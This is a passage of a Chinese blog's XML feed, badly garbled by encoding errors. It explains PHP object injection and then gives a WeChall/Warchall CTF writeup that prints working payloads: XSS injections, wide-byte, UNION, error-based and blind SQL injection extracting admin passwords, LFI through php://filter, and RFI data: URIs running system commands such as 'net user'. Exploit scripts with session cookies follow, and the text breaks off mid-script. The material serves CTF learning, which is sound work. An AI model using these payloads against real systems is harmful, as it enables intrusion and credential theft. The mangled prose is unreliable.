é•¿åº¦ä¸º8, å€¼ä¸ºpassword s:6:&quot;serial&quot; Stringç±»å‹, é•¿åº¦ä¸º6, å€¼ä¸ºserial PHPå¯¹è±¡çš„ååºåˆ—åŒ– ç»è¿‡unserialize()ä¹‹åï¼Œæˆ‘ä»¬çš„å¯¹è±¡åˆè¢«é‡å»ºäº†å‡ºæ¥. 0x04 PHPå¯¹è±¡æ³¨å…¥æœ‰ä¸¤ä¸ªæ¯”è¾ƒç‰¹åˆ«çš„Magicæ–¹æ³•ï¼Œ__sleep æ–¹æ³•ä¼šåœ¨ä¸€ä¸ªå¯¹è±¡è¢«åºåˆ—åŒ–çš„æ—¶å€™è°ƒç”¨ã€‚ __wakeupæ–¹æ³•ä¼šåœ¨ä¸€ä¸ªå¯¹è±¡è¢«ååºåˆ—åŒ–çš„æ—¶å€™è°ƒç”¨ã€‚ é‚£ä¹ˆï¼Œè€ƒè™‘è¿™ä¹ˆä¸€ä¸ªåœºæ™¯ï¼Œå¦‚æœä¸€ä¸ªæ”»å‡»è€…çš„æ•°æ®æ˜¯é€šè¿‡unserialize()æ–¹æ³•ä¼ é€’çš„ï¼Œé‚£ä¹ˆè¿™æ ·å°±å¾ˆå¯èƒ½å¼•å‘â€œphpå¯¹è±¡æ³¨å…¥â€ï¼Œè€Œå¾ˆå¯èƒ½é‚£äº›ä¸è¯¥å¯¹è±¡æœ‰å…³çš„Magicæ–¹æ³•ä¼šæ‰§è¡Œä¸€äº›æ•ˆæœï¼Œæ‰“ä¸ªæ¯”æ–¹ï¼Œå¦‚æœè¯¥å¯¹è±¡æ˜¯ä¸€ä¸ªè®°å½•ä¸´æ—¶æ–‡ä»¶çš„å¯¹è±¡ï¼Œå½“å¯¹è±¡åˆ›å»ºçš„æ—¶å€™ï¼Œå³ä¼šè°ƒç”¨ __constructæ–¹æ³•ï¼Œæ­¤æ—¶ä¼šåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œè€Œ __destructåˆ™ä¼šåˆ é™¤åˆ›å»ºçš„æ–‡ä»¶ã€‚è€Œæ­¤æ—¶æ°å¥½æˆ‘ä»¬å¯ä»¥æ„é€ è¾“å…¥é€šè¿‡unserialize()ä¼ é€’ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å¯¹æˆ‘ä»¬çš„è¾“å…¥ç¨ä½œåŠ å·¥å°±å¯ä»¥å®Œæˆè¾“å…¥æˆ‘ä»¬æƒ³è¦è¾“å…¥çš„ã€‚ ç¤ºä¾‹ä»£ç ï¼š &lt;?php class test { public $filename = &apos;temp.txt&apos;; public function LogData($text) { file_put_contents($this-&gt;filename, $text, FILE_APPEND); //file_put_contents() å‡½æ•°æŠŠä¸€ä¸ªå­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶ä¸­ã€‚ä¸ä¾æ¬¡è°ƒç”¨ fopen()ï¼Œfwrite() ä»¥åŠ fclose() åŠŸèƒ½ä¸€æ ·ã€‚ } public function __destruct() { unlink(dirname(__FILE__) . &apos;/&apos; . $this-&gt;filename); //unlink() å‡½æ•°åˆ é™¤æ–‡ä»¶ } } class user { public $age = 0; public $name = &apos;&apos;; public function PrintData() { echo &apos;Username:&apos;.$this-&gt;name.&apos;&lt;br&gt;&apos;.&apos;age:&apos;.$this-&gt;age; } } if(isset($_GET[&apos;user&apos;])) $usr = unserialize($_GET[&apos;user&apos;]); ?&gt; å®šä¹‰äº†ä¸€ä¸ªtestç±»ç”Ÿæˆä¸€ä¸ªä¸´æ—¶æ–‡ä»¶å’Œä¸€ä¸ªuserç±»ï¼Œæœ€åæœ‰ä¸€ä¸ª â€œunserializeâ€ å€¼ï¼Œå®ƒçš„æœ¬æ„æ˜¯ä¼ é€’userçš„ä¿¡æ¯ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²æœ€åèƒ½å¤Ÿè¢«ååºåˆ—åŒ–ä¸ºtestç±»ï¼Œé‚£ä¹ˆé—®é¢˜å°±å…³é”®äº†ï¼Œå› ä¸ºä¸€ä¸ªtestç±»æœ€åä¼šåˆ é™¤å®ƒçš„åŒåæ–‡ä»¶å¤¹ï¼Œå¦‚æœæ­¤æ—¶æˆ‘ä»¬é€šè¿‡å¦‚ä¸‹ä»£ç æ„é€ ä¸€ä¸²å­—ç¬¦ä¸²ï¼š &lt;?php //include &apos;object_injection.php&apos;; class test{} $obj = new test(); $obj-&gt;filename = &apos;.htaccess&apos;; echo serialize($obj) . &apos;&lt;br /&gt;&apos;; ?&gt; è¿è¡Œç»“æœä¸ºï¼š O:4:â€testâ€:1:{s:8:â€filenameâ€;s:9:â€.htaccessâ€;} æ–°å»ºä¸€ä¸ª.htaccessçš„æ–‡ä»¶,ç„¶åå°†æ‰“å°å‡ºæ¥çš„ç»“æœä¼ å…¥åˆ°ä¹‹å‰é‚£ä¸ªphpä¸­ï¼Œé‚£ä¹ˆæœ€ç»ˆåˆ é™¤çš„å°±æ˜¯è¿™ä¸ªâ€™.htaccessâ€™æ–‡ä»¶äº†ã€‚å› ä¸ºè„šæœ¬ç»“æŸæ—¶ __destructä¼šè¢«è°ƒç”¨ï¼Œä»è€Œè§¦å‘åˆ é™¤ã€‚ è¿™å°±æ˜¯è¯¥æ¼æ´åå­—çš„ç”±æ¥ï¼šä½œä¸ºä¸€ä¸ªæ”»å‡»è€…ï¼Œä¸ºäº†å®ç°æ‰§è¡Œä½ çš„ä»£ç æˆ–è€…å¯¹ä½ æ¥è¯´å…¶ä»–æœªé¢„æ–™åˆ°çš„æœ‰ç”¨çš„è¡¨ç°ï¼Œä¸ä½¿ç”¨æœŸæœ›çš„åºåˆ—åŒ–çš„å¯¹è±¡ï¼Œè€Œæ˜¯æ³¨å…¥å…¶ä»–çš„PHPå¯¹è±¡ã€‚ 0x05 PHPå¯¹è±¡æ³¨å…¥é˜²å¾¡åœ¨å¤„ç†ç”±ç”¨æˆ·æä¾›æ•°æ®çš„åœ°æ–¹ä¸è¦ä½¿ç”¨â€œunserializeâ€ï¼Œä½ å¯ä»¥ä½¿ç”¨â€œjson_decodeâ€ã€‚]]></content>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>PHP</tag>
        <tag>ååºåˆ—åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Wechall CTF writeup2]]></title>
    <url>%2F2016%2F07%2F23%2FWebchall-CTF-writeup2%2F</url>
    <content type="text"><![CDATA[htmlspecialcharshtmlspecialchars()ä¸åŠ å‚æ•°åªä¼šå°†åŒå¼•å·å®ä½“åŒ–ï¼Œè¿™é‡Œåªéœ€è¦å•å¼•å·å³å¯ã€‚ åœ¨æœ¬åœ°æ­å»ºç¯å¢ƒï¼Œä»£ç å¦‚ä¸‹ï¼š &lt;?php if(isset($_GET[&apos;in&apos;])) { $a=$_GET[&apos;in&apos;]; echo &quot;&lt;a href=&apos;http://&quot;.htmlspecialchars($a).&quot;&apos;&gt;Exploit Me&lt;/a&gt;&quot;; echo htmlspecialchars(&quot;&lt;a href=&apos;http://&quot;.htmlspecialchars($a).&quot;&apos;&gt;Exploit Me&lt;/a&gt;&quot;); } ?&gt; è¾“å…¥ä»¥ä¸‹ä»£ç ï¼š http://127.0.0.1:8080/xss/test.php?in=%27%20onmouseover=%27alert(1) ç„¶åé¼ æ ‡è§¦å‘å³å¯å¼¹çª—ã€‚ Connect the Dotsç›²æ–‡å¯†ç  è§£å¯†ä¸ºï¼šthesolutionis*** Tracksä¸»è¦åˆ†ä¸‰æ­¥ï¼š 1.æ³¨å†Œ 2.æŠ•ç¥¨ 3.è¯´å·²æŠ•è¿‡äº† é€šè¿‡æ”¹å®ƒè¯·æ±‚çš„åœ°å€ï¼Œæ¥æ”¹å˜httpç¼“å­˜ã€‚ç¬¬äºŒæ­¥çš„æ—¶å€™å‘ç°å“åº”å¤´æœ‰ä¸ªEtagå­—æ®µï¼Œè¿™ä¸ªå’Œè¯·æ±‚å¤´é‡Œé¢çš„If-None-Matchè¿›è¡ŒåŒ¹é…ã€‚ HTTPåè®®ç¼“å­˜ç­–ç•¥ ä¿®æ”¹è¯·æ±‚å¤´é‡Œçš„WCå­—æ®µå’ŒVOTEå­—æ®µå³å¯ã€‚ PHP 0818PHPå¼±ç±»å‹ é¦–å…ˆçœ‹ä¸€ä¸‹æºç ï¼š function noother_says_correct($number) { $one = ord(&apos;1&apos;); $nine = ord(&apos;9&apos;); for ($i = 0; $i &lt; strlen($number); $i++) { $digit = ord($number{$i}); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) { return false; } } return $number == &quot;3735929054&quot;; } ä¸»è¦çš„æ„æ€å°±æ˜¯ä¸èƒ½æ˜¯1~9çš„æ•°å­—ï¼Œä½†æ˜¯åˆè¦å’Œ3735929054ç›¸ç­‰ï¼Œæ˜æ˜¾æ˜¯PHPå¼±ç±»å‹ç”±äºæ˜¯==ï¼Œ ===ä¼šæ¯”è¾ƒä¸¤ä¸ªå˜é‡çš„ç±»å‹ è€Œ==åªæ¯”è¾ƒä»–ä»¬çš„å€¼ æ¯”å¦‚æ•´æ•°0å’Œæµ®ç‚¹æ•°0.0 ç”¨==æ¯”è¾ƒè¿”å›TRUE ç”¨===æ¯”è¾ƒè¿”å›FLASE 3735929054çš„åå…­è¿›åˆ¶å³0xdeadc0de,0åˆåˆšå¥½ä¸åœ¨1-9é‡Œé¢ï¼Œç¬¦åˆã€‚ Addslashesaddslashes()å‡½æ•°çš„åŠŸèƒ½æ˜¯è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²ã€‚ ä¸»è¦çš„æºç å¦‚ä¸‹ï¼š &lt;?php function asvsmysql_login($username, $password) { $username = addslashes($username); $password = md5($password); ... $query = &quot;SELECT username FROM users WHERE username=&apos;$username&apos; AND password=&apos;$password&apos;&quot;; ... if ($result[&apos;username&apos;] !== &apos;Admin&apos;) { return htmlDisplayError(&apos;You are logged in, but not as Admin.&apos;); } return htmlDisplayMessage(&apos;You are logged in. congrats!&apos;); } ?&gt; addslashes()å‡½æ•°å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥æ¼æ´ã€‚åŸå› æ˜¯%bf%27æœ¬èº«ä¸æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„GBKå­—ç¬¦ï¼Œä½†ç»è¿‡addslashes()è½¬æ¢åå˜ä¸º%bf%5c%27ï¼Œå‰é¢çš„%bf%5cæ˜¯ä¸ªæœ‰æ•ˆçš„GBKå­—ç¬¦ï¼Œæ‰€ä»¥%bf%5c%27å°±ä¼šå½“ä½œä¸€ä¸ªå­—ç¬¦åŠ ä¸€ä¸ªå•å¼•å·ï¼Œè¿™æ ·æ¼æ´å°±è§¦å‘äº†ã€‚mysql_real_escape_string()ä¹Ÿæ˜¯ä¸€æ ·ã€‚ è¾“å…¥ %bf%27 union select Admin%23&amp;password=123 æŠ¥é”™ï¼Œè¯´ä¸è¯†åˆ«è¿™äº”ä¸ªå­—æ¯ï¼Œç„¶åå°±æ˜¯æŠŠå­—æ¯è½¬æ¢æˆå­—ç¬¦ %bf%27 union select CHAR(65,100,109,105,110)%23&amp;password=123 The Guestbookæºç å¾ˆé•¿ï¼Œä¹Ÿæ²¡ä»”ç»†çœ‹ï¼Œé¦–å…ˆå°±æ˜¯å…ˆåšäº†ä¸€ä¸ªæ­£å¸¸çš„ç•™è¨€ï¼Œè¿”å›çš„ç»“æœå¦‚ä¸‹ï¼š ä»”ç»†çœ‹ï¼Œæˆ‘ä»¬å°±å¯ä»¥å‘ç°ä¸€ä¸ªè¹Šè··ï¼Œå°±æ˜¯è¿”å›ä¸€ä¸ªip:8.8.8.8è¿™æ˜¯æˆ‘ç«ç‹çš„ä¸€ä¸ªæ’ä»¶ï¼Œç„¶åæˆ‘å°±è¯•è¯•ï¼Œåœ¨é‡Œé¢æ’å…¥ä¸€äº›æ¶æ„ä»£ç : $query = &quot;CREATE TABLE IF NOT EXISTS gbook_user ( &quot;. &quot;gbu_id INT(11) UNSIGNED PRIMARY KEY, &quot;. # Guestbook userid &quot;gbu_name VARCHAR(63) CHARACTER SET ASCII COLLATE ascii_general_ci, &quot;. # Guestbook username &quot;gbu_password VARCHAR(255) CHARACTER SET ASCII COLLATE ascii_bin ) &quot;; # Guestbook password &lt;-- You need the password for username Admin $db-&gt;queryWrite($query); ä¸Šé¢çš„ä»£ç çœ‹å‡ºè¡¨åæ˜¯ï¼šgbook_userï¼Œå­—æ®µ:gbu_password,gbu_name æ ¹æ®GET ipçš„æŸ¥è¯¢è¯­å¥ï¼Œæ„é€ å¦‚ä¸‹ï¼š â€˜,(select gbu_password from gbook_user where gbu_name=â€™adminâ€™))# PHP 0816é¢˜ç›®è¦æ±‚æˆ‘ä»¬è¯»solution.phpè¿™ä¸ªæ–‡ä»¶ã€‚ ä¸»è¦å°±æ˜¯å‡ ä¸ªå‚æ•°ï¼Œsrcï¼Œhlï¼Œmodeï¼Œå®ƒæ˜¯æŒ‰é¡ºåºè¯»å–å‚æ•°å€¼çš„ï¼Œ php0816SetSourceFileä¸»è¦æ˜¯è®¾ç½®æ˜¾ç¤ºæºç çš„æ–‡ä»¶åï¼Œæœ‰ä¸€ä¸ªç™½åå•è¿‡æ»¤ï¼Œå®ƒä¼šè¯»å–srcï¼Œ ç„¶åæ˜¯php0816executeæ‰§è¡Œç¨‹åºmode=hlï¼Œ ç„¶åå°±æ˜¯php0816addHighlightsï¼Œå®ƒè°ƒç”¨php0816Highlighterï¼Œè€Œè¿™ä¸ªå‡½æ•°ç›´æ¥æœ‰ä¸€ä¸ªgetGet(&apos;src&apos;) æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥æ‰§è¡Œmode=hl&amp;src=solution.phpï¼Œï¼Œè¿™æ ·å°±æ²¡æœ‰è®¿é—®php0816SetSourceFileè¿™ä¸ªå‡½æ•°ã€‚ç›´æ¥è¯»å–äº†solution.php POCï¼š http://www.wechall.net/challenge/php0816/code.php?mode=hl&amp;src=solution.php Table Namesåœ¨usernameåŠ ä¸ªâ€™ æŠ¥é”™äº†ï¼Œå­˜åœ¨æ³¨å…¥ ï¼Œæ„é€ è¯­å¥ã€‚ 1&apos; order by 4# æŠ¥é”™ 1&apos; order by 3# æ­£ç¡® ä¸‰ä¸ªå­—æ®µ 1&apos; and 1=2 union select 1,2,3# æ˜¾ç¤º3 1&apos; and 1=2 union select 1,2,database()# æ•°æ®åº“åï¼šgizmore_tableu61 1&apos; and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x67697A6D6F72655F7461626C65753631# ä¸¤ä¸ªè¡¨åï¼šaaawrong,usertableus4 TMD å¯¹äºç­”æ¡ˆä¹Ÿæ˜¯é†‰äº†,è¿˜å¾—è¿ä¸€å—ï¼š gizmore_tableu61_usertableus4 Training: RegexMiniæ­£åˆ™åŒ¹é… æˆåŠŸçš„è¦æ±‚æ˜¯è¾“å…¥ä¸€ä¸ªé•¿åº¦ &gt; 16 ä½çš„ä¸€ä¸ªç”¨æˆ·åï¼Œå¹¶æˆåŠŸæ³¨å†Œã€‚ æ­£åˆ™è¡¨è¾¾å¼ä¸ºï¼š /^[a-zA-Z]{1,16}$/ åœ¨ php çš„æ­£åˆ™é‡Œé¢ï¼Œ^$çš„æ„æ€æ˜¯åŒ¹é…å‰ä¸€ä¸ªæ¢è¡Œç¬¦ä¹‹åï¼Œä¸‹ä¸€ä¸ªæ¢è¡Œç¬¦ä¹‹å‰ï¼Œè¿™ä¸­é—´ä¸€æ®µçš„å­—ç¬¦ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬åªéœ€è¦è¾“å…¥16ä¸ªä»»æ„å¤§å°å†™å­—æ¯ï¼Œå†åŠ ä¸Šä¸€ä¸ªæ¢è¡Œç¬¦ï¼ˆ%0A) å°±å¯ä»¥äº†ã€‚ Are you serialPHPå¯¹è±¡æ³¨å…¥ Yourself PHPPHPçš„$_SERVER[â€˜PHP_SELFâ€™]é€ æˆçš„XSSæ¼æ´. æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š &lt;?php //require &apos;check.php&apos;; if (isset($_POST[&apos;username&apos;])){ echo sprintf(&quot;Well done %s, you entered your username. But this is not what you need to do.&quot;, htmlspecialchars($_POST[&apos;username&apos;])); } echo &apos;&lt;div class=&quot;box box_c&quot;&gt;&apos;.PHP_EOL; echo sprintf(&apos;&lt;form action=&quot;%s&quot; method=&quot;post&quot;&gt;&apos;, $_SERVER[&apos;PHP_SELF&apos;]).PHP_EOL; echo sprintf(&apos;&lt;div&gt;Username:&lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;&quot; /&gt;&lt;/div&gt;&apos;).PHP_EOL; echo sprintf(&apos;&lt;div&gt;&lt;input type=&quot;submit&quot; name=&quot;deadcode&quot; value=&quot;Submit&quot; /&gt;&lt;/div&gt;&apos;).PHP_EOL; echo sprintf(&apos;&lt;/form&gt;&apos;).PHP_EOL; echo &apos;&lt;/div&gt;&apos;.PHP_EOL; ?&gt; æ„é€ POCï¼š http://127.0.0.1:8080/xss/test1.php/&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt; æ•ˆæœå¦‚ä¸‹ï¼š PHP 0819PHP heredoc é¢˜çš„æ„æ€å°±æ˜¯è®©eval=â€™1337â€™,ä½†æ˜¯è¿‡æ»¤äº†å•å¼•å·ï¼Œä½¿ç”¨heredocä¾¿èƒ½ç»•è¿‡å¯¹äºå¼•å·çš„è¿‡æ»¤ï¼Œæ³¨å…¥æƒ³è¦çš„å­—ç¬¦ä¸²ã€‚ php ä¸­çš„ heredocæŠ€æœ¯æ˜¯phpç”¨æ¥å¼•ç”¨å­—ç¬¦ä¸²çš„ä¸€ç§æ–¹å¼ã€‚åœ¨phpwindä¸­å·§å¦™çš„è¿ç”¨äº†è¿™ä¸ªæŠ€æœ¯ï¼Œå®ç°äº†é€»è¾‘ä»£ç å’Œç•Œé¢è®¾è®¡çš„åˆ†ç¦»ã€‚ è¯­æ³•ï¼š 1. ä½¿ç”¨æ“ä½œç¬¦ â€œ&lt;&lt;&lt;â€ 2. æ“ä½œç¬¦åç´§è·Ÿæ ‡è¯†ç¬¦ï¼ˆå¼€å§‹æ ‡è¯†ç¬¦ï¼‰ï¼Œä¹‹åé‡èµ·æ–°çš„ä¸€è¡Œ è¾“å…¥è¦å¼•ç”¨çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥åŒ…å«å˜é‡ã€‚ 3. æ–°çš„ä¸€è¡Œï¼Œé¡¶æ ¼å†™ç»“æŸè¡¨ç¤ºç¬¦ï¼Œä»¥åˆ†å·ç»“æŸã€‚ è¦æ³¨æ„åˆ°å‡ ç‚¹ï¼š 1. æ ‡è¯†ç¬¦å¯ä»¥è‡ªå®šä¹‰ ä¸€èˆ¬çš„ æœ‰EOT ï¼ŒEOD EOF ç­‰ï¼Œ åªè¦ä¿æŒå¼€å§‹è¡¨ç¤ºç¬¦å’Œç»“æŸè¡¨ç¤ºç¬¦ä¸€æ ·å³å¯ã€‚ 2. ç»“æŸè¡¨ç¤ºç¬¦å¿…é¡»ç‹¬å ä¸€è¡Œï¼Œä¸”å¿…é¡»é¡¶æ ¼å†™ï¼Œæœ€åä»¥ â€˜;â€™ åˆ†å·ç»“å°¾ã€‚ 3. æ‰€æœ‰å¼•ç”¨çš„å­—ç¬¦ä¸²ä¸­å¯ä»¥åŒ…å«å˜é‡ï¼Œæ— éœ€å­—ç¬¦ä¸²è¿æ¥ç¬¦ã€‚ ä¾‹å¦‚ï¼š echo &lt;&lt;&lt;suibian æ­£æ–‡ æ­£æ–‡ suibian; // æ ¼å¼åº”è¯¥æ˜¯ &lt;&lt;&lt;+ä»»æ„å­—ç¬¦x+æ¢è¡Œ+å­—ç¬¦ä¸²+æ¢è¡Œ+ä»»æ„å­—ç¬¦x+;æ¢è¡Œ æ„é€ POCï¼š http://www.wechall.net/challenge/space/php0819/index.php?eval=&lt;&lt;&lt;s%0a1337%0as;%0a MD5.SALTç®€å•çš„sqlæ³¨å…¥ æœ€åæ„é€ è¯­å¥ï¼š â€˜ and 1=2 union select password,2 from users where username=â€Adminâ€# Order By Queryorder by æ³¨å…¥ã€‚ 1.å¯ä»¥ä½¿ç”¨andè¿›è¡ŒåŒé‡æŸ¥è¯¢ 1 and (select count(*) from products group by concat(version(),0Ã—27202020,floor(rand(0)*2-1)))â€“ 2.åœ¨desc/asc [å‚æ•°] ä¹‹åä½¿ç”¨åŒé‡æŸ¥è¯¢ 1 desc,(select count(*) from users group by concat(version(),0x27202020,floor(rand(0)*2-1)))&#39;5.0.95-community&#39; å…·ä½“çš„è¯·å‚ç…§ï¼šorder by/limitä¹‹åæ³¨å…¥ å…³äºæŠ¥é”™æ³¨å…¥çš„ä¸€äº›è¯­æ³•è¯·å‚ç…§ï¼šæŠ¥é”™æ³¨å…¥æ–¹æ³•æ•´ç† æ„é€ POCï¼š http://www.wechall.net/challenge/order_by_query/index.php?by=1 and ExtractValue(1,(select password from users where username=CHAR(65, 100, 109, 105, 110)))# å¾—åˆ°MD5ï¼š C3CBEB0C8ADC66F2922C65E7784BE14 Can you read metesseractè¿™ä¸ªè½¯ä»¶å¯ä»¥åšocr Crappyshareæ„é€ POC: http://www.wechall.net/challenge/crappyshare/crappyshare.php?file://solution.php å½“æˆ‘ä»¬è¾“å…¥çš„file://å‚æ•°è¢«å¸¦å…¥curlä¸­æ‰§è¡Œæ—¶ï¼ŒåŸæœ¬çš„è¿œç¨‹URLè®¿é—®ä¼šè¢«é‡å®šå‘åˆ°æœ¬åœ°ç£ç›˜ä¸Šï¼Œä»è€Œè¾¾åˆ°è¶Šæƒè®¿é—®æ–‡ä»¶çš„ç›®çš„ æ¨èä¸€ç¯‡æ–‡ç« ï¼šLFIã€RFIã€PHPå°è£…åè®®å®‰å…¨é—®é¢˜å­¦ä¹  Warchall: Live LFIè¿›å»ä¹‹åå‘ç°å·¦ä¸Šè§’ï¼Œæœ‰ä¸ªæŒ‰é’®ï¼Œç›´æ”¹åé¢çš„å‚æ•°ä¸ºsolution.php, POC1:http://lfi.warchall.net/index.php?lang=solution.php å›åº”å¦‚ä¸‹ï¼š teh falg si naer! the flag is near! PHP Warning(2): Illegal string offset &apos;welcome&apos; in index.php line 12 Backtrace starts in index.php line 12. GWF_Debug::error_handler() core/inc/util/GWF_Debug.php line 183. æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼Œä½¿ç”¨php://filter/readè¯»ä¸€ä¸‹solution.phpçš„æºç  POC2: http://lfi.warchall.net/?lang=php://filter/read=convert.base64-encode/resource=solution.php base64è§£å¯†ï¼š &lt;html&gt; &lt;body&gt; &lt;pre style=&quot;color:#000;&quot;&gt;teh falg si naer!&lt;/pre&gt; &lt;pre style=&quot;color:#fff;&quot;&gt;the flag is near!&lt;/pre&gt; &lt;/body&gt; &lt;/html&gt; &lt;?php # YOUR_TROPHY return &apos;SteppinStones42Pie&apos;; # &lt;-Â´ ?&gt; Warchall: Live RFIèƒ½æŸ¥çœ‹é¡µé¢èƒ½å®¹çš„PHPä¼ªåè®®ï¼Œæˆ‘çŸ¥é“çš„åªæœ‰ä¸¤ç§ï¼š ?file=data:text/plain,&lt;?php system(&quot;net user&quot;)?&gt; ?file=php://filter/read=convert.base64-encode/resource=index.php æˆ‘ä½¿ç”¨filterè¯»åè®®å‡ºæ¥äº†ç«Ÿç„¶ï¼š PGh0bWw+Cjxib2R5Pgo8cHJlPk5PVEhJTkcgSEVSRT8/Pz88L3ByZT4KPC9ib2R5Pgo8L2h0bWw+CgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCByZXR1cm4gJ0xvd19INE5HSU5HX0ZydWl0JzsgPz4K ä½†æ˜¯è§£å¯†å‘ç°ä¸å¯¹æœ‰ï¼Ÿï¼Ÿï¼Ÿï¼Œç„¶åæˆ‘å‘ç°base64é‡Œé¢æœ‰å¥½å¤šé‡å¤çš„ï¼Œç„¶åæˆ‘åˆ é™¤ç‚¹ &lt;html&gt; &lt;body&gt; &lt;pre&gt;NOTHING HERE????&lt;/pre&gt; &lt;/body&gt; &lt;/html&gt; &lt;?php return &apos;Low_H4NGING_Fruit&apos;; ?&gt; å¥½å§ï¼Œï¼Œï¼Œ è¯•äº†è¯•dataåè®®,ä¹Ÿå¯ä»¥ã€‚ http://rfi.warchall.net/index.php?lang=data:text/plain,&lt;?php system(â€œcat solution.phpâ€)?&gt; Impossible nâ€™est pas franÃ§aisåˆ†è§£ä¸€ä¸ªå¾ˆå¤§çš„æ•°çš„è´¨å› æ•°ã€‚éœ€è¦6s å†…æäº¤ ä½†æ˜¯ï¼Œåªè¦æˆ‘ä»¬å°è¯•æäº¤ä¸€æ¬¡ä¹‹åï¼Œå°±å¯ä»¥å‘ç°å®ƒä¼šè¿”å›ä¸€ä¸ªæ­£ç¡®çš„è§£ã€‚ æ—¢ç„¶å¦‚æ­¤ï¼Œæˆ‘ä»¬åªè¦å…ˆæäº¤ä¸€æ¬¡ï¼Œç„¶åç¨‹åºè¯»å–å®ƒè¿”å›çš„æ­£ç¡®æ•°å­—ä¸²ï¼Œå†æäº¤å°±å¯ä»¥äº†ã€‚ pythonè„šæœ¬å¦‚ä¸‹ï¼š #!/usr/bin/env python # coding=utf-8 import requests import urllib2 import lxml import lxml.html as H from bs4 import BeautifulSoup cookie = { &apos;WC&apos;: &apos;9038838-0-DGwGp7VNYefa6o7o&apos; } def get_number(): number_url = &apos;http://www.wechall.net/challenge/impossible/index.php?request=new_number&apos; #opener = urllib2.build_opener() #opener.addheaders.append((&apos;Cookie&apos;,&apos;WC=9038838-0-DGwGp7VNYefa6o7o&apos;)) #f = opener.open(number_url) #html = f.read() #html = urllib2.urlopen(number_url).read() #soup = BeautifulSoup(html) resp = requests.get(number_url, cookies=cookie) res =resp.content soup = BeautifulSoup(res) div_new = soup.find(&apos;div&apos;,{&quot;id&quot;:&quot;page&quot;}) movie_new = div_new.get_text() print movie_new get_number() def get_answer(): post_data = { &apos;solution&apos;: &apos;&apos;, &apos;cmd&apos;: &apos;Send&apos;, &apos;gwf3_csrf&apos;: &apos;bNZbC2XL&apos; } url = &apos;http://www.wechall.net/challenge/impossible/index.php&apos; resp = requests.post(url, cookies=cookie, data=post_data) # print resp.text d = H.document_fromstring(resp.text) import re ar = re.compile(r&apos;&quot;(\d+)&quot;&apos;) text = d.xpath(&apos;//div[@class=\&apos;gwf_errors\&apos;]/ul/li&apos;)[0].text_content() ans = ar.findall(text)[0] print ans post_data = { &apos;solution&apos;: ans, &apos;cmd&apos;: &apos;Send&apos;, &apos;gwf3_csrf&apos;: &apos;bNZbC2XL&apos; } resp = requests.post(url, cookies=cookie, data=post_data) print resp.text get_answer() è¿è¡Œç»“æœä¸ºï¼š Py-TongæŸ¥çœ‹ Python æºä»£ç ï¼Œå¯ä»¥å‘ç°ï¼Œè¯¥ç¨‹åºä¼šè¯»å–ä¸€ä¸ªä½ æŒ‡å®šçš„æ–‡ä»¶ä¸¤æ¬¡ã€‚ å¦‚æœç¬¬ä¸€æ¬¡è¯»å–æˆåŠŸä¹‹åï¼Œç¬¬äºŒæ¬¡å°è¯•è¯»å–å¤±è´¥ï¼Œè¿”å›trueã€‚ å¦‚æœç¬¬ä¸€æ¬¡å’Œç¬¬äºŒæ¬¡è¯»å–å¾—åˆ°çš„å†…å®¹ä¸ä¸€æ ·ï¼Œè¿”å›trueã€‚ è¿™æ ·ï¼ŒçŸ¥é“äº†è¿™äº›ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥å†™ä¸€ä¸ªæ–‡ä»¶ï¼Œå»å’Œè¿™ä¸ªç¨‹åºè¿›è¡Œç«äº‰ã€‚ Blinded by the lightç›²æ³¨ ä¸»è¦çš„ä»£ç ä¸ºï¼š $query = â€œSELECT 1 FROM (SELECT password FROM blight WHERE sessid=$sessid) b WHERE password=â€™$passwordâ€™â€; è¿™é‡Œçš„ password æ˜æ˜¾æ²¡æœ‰ç»è¿‡è¿‡æ»¤å°±å¸¦å…¥æŸ¥è¯¢ã€‚é‚£ä¹ˆï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ OR ç›²æ³¨æ¥è®©å®ƒè¿”å›ä¸åŒçš„é¡µé¢ï¼Œå€Ÿæ­¤æ¥åˆ¤æ–­è¯­å¥çš„æ­£ç¡®æ€§ã€‚ è„šæœ¬å¦‚ä¸‹ï¼š #!/usr/bin/env python2 import urllib import urllib2 def makePayload(statement): return &quot;&apos; or substring(password, %d, 1)%s&apos;%s&quot; % (statement[0], statement[1], statement[2]) def checkResponse(response): return response.find(&quot;Welcome back&quot;) &gt; 0 def doAssert(statement): url = &apos;http://www.wechall.net/challenge/blind_light/index.php&apos; values = {&apos;injection&apos;:makePayload(statement),&apos;inject&apos;:&apos;Inject&apos;} data = urllib.urlencode(values) req = urllib2.Request(url, data) req.add_header(&apos;cookie&apos;,&apos;WC=8448003-14306-bFzUNqXxpwMud1xu&apos;) response = urllib2.urlopen(req) content = response.read() return checkResponse(content) if __name__ == &quot;__main__&quot;: alphalist = &quot;0123456789ABCDEF&quot; result = [] for idx in range(1,33): start = 0 end = 16 #[start, end) while (start &lt; end): print(&quot;[%d, 